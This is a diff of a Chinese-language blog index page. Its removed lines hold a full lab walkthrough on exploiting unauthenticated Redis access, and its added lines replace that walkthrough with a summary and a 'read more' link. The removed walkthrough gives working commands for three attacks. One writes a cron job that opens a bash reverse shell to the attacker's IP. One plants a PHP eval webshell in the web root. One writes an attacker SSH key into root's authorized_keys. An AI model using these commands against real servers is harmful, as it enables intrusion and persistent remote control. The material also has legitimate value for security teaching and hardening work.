@@ -344,38 +344,14 @@
 
       
         
-          
-            <h1 id="redis未授权访问漏洞的几种利用方式"><a href="#redis未授权访问漏洞的几种利用方式" class="headerlink" title="redis未授权访问漏洞的几种利用方式"></a>redis未授权访问漏洞的几种利用方式</h1><p><strong>这篇文章记录一下redis未授权访问漏洞的几种利用方式</strong></p>
-<h3 id="漏洞利用环境"><a href="#漏洞利用环境" class="headerlink" title="漏洞利用环境"></a>漏洞利用环境</h3><p><strong>靶机：centos6.4:192.168.0.104，开启了redis-server，由于配置不当而存在redis未授权访问</strong></p>
-<p><strong>攻击机：kali2.0：192.168.0.101，用来攻击配置不当导致存在redis未授权访问漏洞的centos6.4</strong></p>
-<p><strong>修改centos中redis配置文件redis.conf中的几个地方</strong></p>
-<pre><code>1.bind 127.0.0.1前面需要加上注释符
-2.protected-mode要修改为no
-</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/L7g94HcIji.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/8E377C775B.png?imageslim" alt="mark"></p>
-<h3 id="利用redis未授权访问漏洞反弹shell"><a href="#利用redis未授权访问漏洞反弹shell" class="headerlink" title="利用redis未授权访问漏洞反弹shell"></a>利用redis未授权访问漏洞反弹shell</h3><p><strong>首先在centos上开启redis服务</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./src/redis-server redis.conf</div></pre></td></tr></table></figure>
-<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/DF7D9Cm9AG.png?imageslim" alt="mark"></p>
-<p><strong>接下来使用kali上的redis-cli去访问redis-server</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./src/redis-cli -h 192.168.0.104 -p 6379</div></pre></td></tr></table></figure>
-<p><strong>可以看到由于配置不当导致redis未授权访问漏洞，可以直接进入redis的交互式shell</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/AelG2eB0m2.png?imageslim" alt="mark"></p>
-<p><strong>下面通过该redis未授权访问漏洞利用linux任务计划来反弹一个shell到我们的kali上面</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">set</span> aaa <span class="string">"\n\n* * * * * bash -i /dev/tcp/192.168.0.101/7777 0&gt;&amp;1\n\n"</span></div><div class="line">config <span class="built_in">set</span> dir /var/spool/cron</div><div class="line">config <span class="built_in">set</span> dbfilename root</div><div class="line">save</div></pre></td></tr></table></figure>
-<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/56CBadKaEl.png?imageslim" alt="mark"><br><strong>在redis的交互shell中依次执行完上述命令后，可以看到成功的在centos的任务计划目录<code>/var/spool/cron</code>下创建了一个任务计划文件root，该文件里面的cron将执行每分钟执行一次向kali反弹shell的操作</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/l2k14IibBm.png?imageslim" alt="mark"></p>
-<p><strong>可以看到我们的kali上已经接收到了centos反弹过来的shell，可以执行命令</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/Bc3EL7h89K.png?imageslim" alt="mark"></p>
-<h3 id="利用redis未授权访问写webshell"><a href="#利用redis未授权访问写webshell" class="headerlink" title="利用redis未授权访问写webshell"></a>利用redis未授权访问写webshell</h3><p><strong>还可以通过redis未授权访问漏洞向网站根目录写一个webshell</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">set</span> aaa <span class="string">"\n\n&lt;?php @eval(<span class="variable">$_POST</span>['c1imber']);?&gt;\n\n"</span></div><div class="line">config <span class="built_in">set</span> dir /var/www/html</div><div class="line">config <span class="built_in">set</span> dbfilename shell.php</div><div class="line">save</div></pre></td></tr></table></figure>
-<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/DE4e2A3L0D.png?imageslim" alt="mark"><br><strong>可以看到成功向网站根目录写了一个webshell</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/670dgDIH27.png?imageslim" alt="mark"><br><strong>访问该webshell，php一句话木马被解析</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/2D4BG6ebkA.png?imageslim" alt="mark"></p>
-<h3 id="利用redis未授权访问向服务器写入ssh公钥"><a href="#利用redis未授权访问向服务器写入ssh公钥" class="headerlink" title="利用redis未授权访问向服务器写入ssh公钥"></a>利用redis未授权访问向服务器写入ssh公钥</h3><p><strong>首先使用kali在本地生成一对密钥</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh-keygen -t rsa</div></pre></td></tr></table></figure>
-<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/D5KF0LHCbI.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/hBIBd9J9kf.png?imageslim" alt="mark"><br><strong>之后将公钥<code>id_rsa.pub</code>写入到一个文件内</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(<span class="built_in">echo</span> -e <span class="string">"\n\n"</span>;cat id_rsa.pub;<span class="built_in">echo</span> -e <span class="string">"\n\n"</span>)&gt;key.txt</div></pre></td></tr></table></figure>
-<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/HGJfgl2HGf.png?imageslim" alt="mark"><br><strong>之后利用redis未授权访问漏洞将公钥写到centos的<code>/root/.ssh/authorized_keys</code>文件中</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">cat /root/.ssh/key.txt | ./src/redis-cli -h 192.168.0.4 -x <span class="built_in">set</span> aaa</div><div class="line">redis -h 192.168.0.4 -p 6379</div><div class="line">config <span class="built_in">set</span> dir /root/.ssh</div><div class="line">config <span class="built_in">set</span> dbfilename authorized_keys</div><div class="line">save</div></pre></td></tr></table></figure>
-<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/c9G6E82kGG.png?imageslim" alt="mark"><br><strong>可以看到在centos的<code>/root/.ssh</code>目录下的<code>authorized_keys</code>文件里已经成功写入了我们刚刚生成的公钥</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/7ll8jEI5lJ.png?imageslim" alt="mark"><br><strong>由于我们将公钥写入了服务器，我们自己这有私钥，之后就可以使用ssh直接远程登陆了</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh 192.168.0.4</div></pre></td></tr></table></figure>
-<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/gd8GC6lbie.png?imageslim" alt="mark"></p>
-
-          
+          <h1 id="redis未授权访问漏洞的几种利用方式"><a href="#redis未授权访问漏洞的几种利用方式" class="headerlink" title="redis未授权访问漏洞的几种利用方式"></a>redis未授权访问漏洞的几种利用方式</h1><p><strong>这篇文章记录一下redis未授权访问漏洞的几种利用方式,包括如何利用redis未授权访问漏洞通过任务计划反弹shell，向网站根目录写webshell以及利用redis未授权访问向服务器写入ssh公钥</strong><br>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/08/19/redis/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
